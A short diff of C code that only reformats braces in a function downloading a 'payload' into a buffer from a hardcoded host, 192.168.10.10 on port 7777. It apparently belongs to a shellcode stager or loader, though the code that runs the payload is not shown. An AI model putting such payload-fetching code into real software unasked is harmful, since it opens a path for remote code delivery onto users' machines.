@@ -7,8 +7,7 @@
 // adjust size to the expected payload size
 unsigned char buf[1];
 
-void dl_to_buffer(const wchar_t* host, INTERNET_PORT port)
-{
+void dl_to_buffer(const wchar_t* host, INTERNET_PORT port) {
 	int counter = 0;
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
@@ -89,8 +88,8 @@ void dl_to_buffer(const wchar_t* host, INTERNET_PORT port)
 	}
 }
 
-int main()
-{
+int main() {
 	dl_to_buffer(L"192.168.10.10", 7777);
 	return 0;
+
 }
